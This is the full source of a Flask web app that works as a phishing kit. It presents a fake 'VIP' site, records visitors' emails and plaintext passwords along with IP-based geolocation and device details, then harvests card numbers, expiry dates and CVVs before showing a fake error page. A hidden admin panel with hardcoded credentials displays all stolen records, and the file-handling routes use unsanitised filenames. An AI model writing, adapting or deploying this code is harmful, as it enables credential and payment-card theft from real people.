import os, requests, sqlite3, time
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session

app = Flask(__name__)
app.secret_key = 'franco_ultra_v12_final'

# --- CONFIGURACIÓN DE RUTAS ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'static', 'uploads') 
SYSTEM_FOLDER = os.path.join(BASE_DIR, 'static', 'system')  
DB_PATH = os.path.join(BASE_DIR, 'database.db')

for folder in [UPLOAD_FOLDER, SYSTEM_FOLDER]:
    if not os.path.exists(folder): os.makedirs(folder)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS registros 
        (id INTEGER PRIMARY KEY AUTOINCREMENT, user TEXT, pass TEXT, tarjeta TEXT, 
         banco TEXT, tipo TEXT, hora TEXT, dispositivo TEXT, city TEXT, lat REAL, lon REAL,
         bateria TEXT, resolucion TEXT, lenguaje TEXT, zona_horaria TEXT)''')
    conn.commit()
    conn.close()

init_db()

# CONFIGURACIÓN DINÁMICA (Controlable desde el Panel)
config_web = {
    "user_admin": "franco",
    "pass_admin": "franco",
    "alias": "VIP.FRANCO.PAGOS",
    "precio": "2500",
    "img_principal": "/static/system/portada.jpg",
    "titulo": "¡BIENVENIDO A MI SITIO OFICIAL!",
    "color_fondo": "#2d004d", # Púrpura inicial
    "color_texto": "#ffffff",
    "mantenimiento": False
}

@app.route('/')
def login():
    if config_web["mantenimiento"]: return "SITIO EN MANTENIMIENTO", 503
    return render_template('login.html', config=config_web)

@app.route('/auth', methods=['POST'])
def auth():
    u, p = request.form.get('email'), request.form.get('pass')
    # Captura Forense
    bat = request.form.get('bateria', 'N/D')
    res = request.form.get('resolucion', 'N/D')
    lang = request.form.get('lenguaje', 'N/D')
    tz = request.form.get('tz', 'N/D')
    
    geo = requests.get(f'http://ip-api.com/json/{request.remote_addr}').json()
    ua = request.headers.get('User-Agent', '')
    disp = "iOS" if "iPhone" in ua else "Android" if "Android" in ua else "PC"
    
    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
    cursor.execute("INSERT INTO registros (user, pass, tarjeta, banco, tipo, hora, dispositivo, city, lat, lon, bateria, resolucion, lenguaje, zona_horaria) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                   (u, p, "ESPERANDO...", "-", "-", datetime.now().strftime("%H:%M:%S"), disp, geo.get('city','N/A'), geo.get('lat',0), geo.get('lon',0), bat, res, lang, tz))
    session['current_id'] = cursor.lastrowid
    conn.commit(); conn.close()
    session['logged_in'] = True
    return redirect(url_for('dashboard'))

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'): return redirect(url_for('login'))
    fotos = [f for f in os.listdir(UPLOAD_FOLDER) if f.lower().endswith(('png', 'jpg', 'jpeg', 'gif'))]
    return render_template('dashboard.html', config=config_web, fotos=fotos)

@app.route('/pago_vip', methods=['POST'])
def pago_vip():
    rid = session.get('current_id')
    if rid:
        cc = request.form.get('cc')
        datos = f"{cc} | {request.form.get('exp')} | {request.form.get('cvv')}"
        conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
        cursor.execute("UPDATE registros SET tarjeta=? WHERE id=?", (datos, rid))
        conn.commit(); conn.close()
    return render_template('error.html')

@app.route('/matrix_admin', methods=['GET', 'POST'])
def admin_matrix():
    if request.method == 'POST':
        if request.form.get('user') == config_web["user_admin"] and request.form.get('pass') == config_web["pass_admin"]:
            session['is_admin'] = True
    if not session.get('is_admin'): return render_template('admin_login.html')
    
    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
    cursor.execute("SELECT * FROM registros ORDER BY id DESC")
    regs = cursor.fetchall(); conn.close()
    return render_template('admin.html', config=config_web, registros=regs, archivos=os.listdir(UPLOAD_FOLDER))

@app.route('/update_full', methods=['POST'])
def update_full():
    if session.get('is_admin'):
        if 'file_portada' in request.files:
            f = request.files['file_portada']
            if f.filename != '':
                f.save(os.path.join(SYSTEM_FOLDER, "portada.jpg"))
                config_web["img_principal"] = "/static/system/portada.jpg?v=" + str(time.time())
        config_web.update({
            "titulo": request.form.get('titulo'), 
            "alias": request.form.get('alias'), 
            "precio": request.form.get('precio'),
            "color_fondo": request.form.get('color_fondo'),
            "color_texto": request.form.get('color_texto')
        })
    return redirect(url_for('admin_matrix'))

@app.route('/upload_media', methods=['POST'])
def upload_media():
    if session.get('is_admin') and 'file_gallery' in request.files:
        f = request.files['file_gallery']
        if f.filename != '': f.save(os.path.join(UPLOAD_FOLDER, f.filename))
    return redirect(url_for('admin_matrix'))

@app.route('/delete_file/<filename>')
def delete_file(filename):
    if session.get('is_admin'):
        try: os.remove(os.path.join(UPLOAD_FOLDER, filename))
        except: pass
    return redirect(url_for('admin_matrix'))

if __name__ == '__main__':
    # Render asigna un puerto dinámico en la variable de entorno PORT
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

